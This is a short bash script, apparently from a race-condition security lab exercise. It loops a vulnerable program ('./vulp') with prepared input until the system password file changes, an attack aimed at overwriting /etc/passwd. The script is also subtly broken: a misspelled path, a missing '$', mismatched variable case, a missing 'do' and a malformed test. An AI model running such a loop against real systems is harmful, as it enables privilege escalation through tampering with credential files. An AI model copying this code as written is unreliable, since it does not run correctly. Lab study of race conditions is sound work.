CHECK_FILE="ls -l /ect/passwd"
old=$($CHECK_FILE)
new=$(CHECK_FILE)
while [ "$OLD"=="$NEW"]
    ./vulp<passwd_input
    new=$($CHECK_FILE)
done
echo "STOP ...THE passwd file has been changed"